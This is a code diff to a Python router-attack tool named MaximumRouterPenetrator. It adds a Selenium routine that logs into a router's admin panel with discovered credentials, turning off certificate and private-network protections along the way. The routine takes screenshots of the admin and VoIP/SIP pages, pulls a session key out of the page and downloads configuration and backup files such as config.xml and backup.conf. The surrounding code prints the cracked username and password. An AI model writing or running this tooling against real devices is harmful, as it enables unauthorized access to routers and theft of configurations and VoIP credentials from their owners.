@@ -1900,6 +1900,119 @@ class MaximumRouterPenetrator:
         
         return result
     
+    def _selenium_full_browse_and_capture(self, ip: str, credentials: tuple, pages: list, config_paths: list, verbose: bool) -> Dict[str, Any]:
+        """Keep Chrome alive, navigate admin/VoIP/SIP, take screenshots, and download configs via XHR with session cookies/tokens."""
+        out: Dict[str, Any] = {'screenshots': {}, 'downloaded_configs': []}
+        try:
+            from selenium import webdriver
+            from selenium.webdriver.chrome.options import Options
+            from selenium.webdriver.common.by import By
+            from selenium.webdriver.support.ui import WebDriverWait
+            from selenium.webdriver.support import expected_conditions as EC
+        except ImportError:
+            if verbose:
+                print(f"         ❌ Selenium not available for full browse")
+            return out
+
+        chrome_options = Options()
+        if self.selenium_config.get('headless'):
+            chrome_options.add_argument('--headless')
+        chrome_options.add_argument('--no-sandbox')
+        chrome_options.add_argument('--disable-dev-shm-usage')
+        chrome_options.add_argument('--disable-gpu')
+        chrome_options.add_argument('--window-size=1920,1080')
+        chrome_options.add_argument('--ignore-certificate-errors')
+        chrome_options.add_argument('--allow-running-insecure-content')
+        chrome_options.add_argument('--disable-features=BlockInsecurePrivateNetworkRequests')
+        try:
+            chrome_options.set_capability('acceptInsecureCerts', True)
+        except Exception:
+            pass
+
+        driver = webdriver.Chrome(options=chrome_options)
+        driver.set_page_load_timeout(max(15, self.selenium_config.get('timeout', 30)))
+
+        # Set Basic Auth header via CDP
+        try:
+            if credentials and len(credentials) == 2:
+                import base64 as _b64
+                userpass = f"{credentials[0]}:{credentials[1]}".encode('ascii')
+                auth = _b64.b64encode(userpass).decode('ascii')
+                driver.execute_cdp_cmd('Network.enable', {})
+                driver.execute_cdp_cmd('Network.setExtraHTTPHeaders', {
+                    'headers': {'Authorization': f'Basic {auth}', 'Upgrade-Insecure-Requests': '1'}
+                })
+        except Exception:
+            pass
+
+        try:
+            import os
+            os.makedirs('screenshots', exist_ok=True)
+            base_http = f"http://{ip}"
+            admin_loaded = False
+            for idx, rel in enumerate(pages):
+                url = base_http + rel
+                try:
+                    driver.get(url)
+                    try:
+                        WebDriverWait(driver, 8).until(lambda d: d.execute_script('return document.readyState') == 'complete')
+                    except Exception:
+                        pass
+                    shot_name = f"screenshots/{ip}_{idx}.png"
+                    driver.save_screenshot(shot_name)
+                    if 'admin' in rel and not admin_loaded:
+                        out['screenshots']['admin'] = shot_name
+                        admin_loaded = True
+                    if any(x in rel for x in ['voip', 'sip', 'voice']):
+                        out['screenshots']['voip'] = shot_name
+                except Exception:
+                    continue
+
+            # Extract session key from DOM if present
+            session_key = ''
+            try:
+                sk = driver.execute_script("return (document.querySelector('[name\\=\\'sessionkey\\']')||{}).value || window.sessionKey || '';")
+                if isinstance(sk, str):
+                    session_key = sk
+                    if verbose and session_key:
+                        print(f"            🔑 LIVE DEBUG: Selenium session key: {session_key[:20]}...")
+            except Exception:
+                pass
+
+            # Download configs via XHR inside the browser context
+            for rel in config_paths:
+                try:
+                    js = """
+                        const done = arguments[0];
+                        const sess = arguments[1];
+                        const url = arguments[2];
+                        (async () => {
+                          try {
+                            const headers = {};
+                            if (sess) { headers['X-Session-Key'] = sess; }
+                            const resp = await fetch(url, { credentials: 'include', headers });
+                            const text = await resp.text();
+                            done({ ok: true, status: resp.status, length: text.length, text });
+                          } catch (e) {
+                            done({ ok: false, error: String(e) });
+                          }
+                        })();
+                    """
+                    full_url = base_http + rel
+                    data = driver.execute_async_script(js, session_key, full_url)
+                    if data and data.get('ok') and data.get('length', 0) > 100:
+                        fname = f"config_{ip}__{rel.strip('/').replace('/', '__') or 'root'}.txt"
+                        with open(fname, 'w', encoding='utf-8', errors='ignore') as f:
+                            f.write(data.get('text',''))
+                        out['downloaded_configs'].append({'path': rel, 'filename': fname, 'size': data.get('length', 0)})
+                except Exception:
+                    continue
+        finally:
+            # Keep Chrome alive during run as requested; do not quit here
+            pass
+
+        return out
+    
     def _generate_html_poc_report(self, target_ip: str, result: dict, router_info: dict, verbose: bool) -> dict:
         """Generate comprehensive HTML PoC report"""
         try:
@@ -2875,6 +2988,39 @@ class MaximumRouterPenetrator:
                         print(f"            🎯 LIVE DEBUG: Working credential: {username}:{password}")
                         print(f"            📊 LIVE DEBUG: Verification score: {verification['score']}")
                     
+                    # NEW: Full Selenium-driven browse, screenshots, and config downloads
+                    try:
+                        selenium_flow = self._selenium_full_browse_and_capture(
+                            ip,
+                            (username, password),
+                            [
+                                "/admin/",
+                                "/admin/voip.asp", 
+                                "/admin/sip.asp", 
+                                "/voip.html", 
+                                "/sip.html"
+                            ],
+                            [
+                                "/config.xml", 
+                                "/backup.conf", 
+                                "/cgi-bin/config.exp", 
+                                "/cgi-bin/backup.cgi", 
+                                "/admin/export.asp"
+                            ],
+                            verbose
+                        )
+                        if selenium_flow.get('screenshots'):
+                            auth_result['admin_screenshot'] = selenium_flow['screenshots'].get('admin')
+                            auth_result['voip_screenshot'] = selenium_flow['screenshots'].get('voip')
+                        if selenium_flow.get('downloaded_configs'):
+                            # Merge into downstream result container used later in Phase 6
+                            if 'downloaded_configs' not in auth_result:
+                                auth_result['downloaded_configs'] = []
+                            auth_result['downloaded_configs'].extend(selenium_flow['downloaded_configs'])
+                    except Exception as e:
+                        if verbose:
+                            print(f"            ❌ LIVE DEBUG: Selenium full-browse error: {str(e)[:70]}")
+
                     # CAPTURE SCREENSHOTS IMMEDIATELY AFTER VERIFICATION
                     if self.screenshot_mode:
                         if verbose:
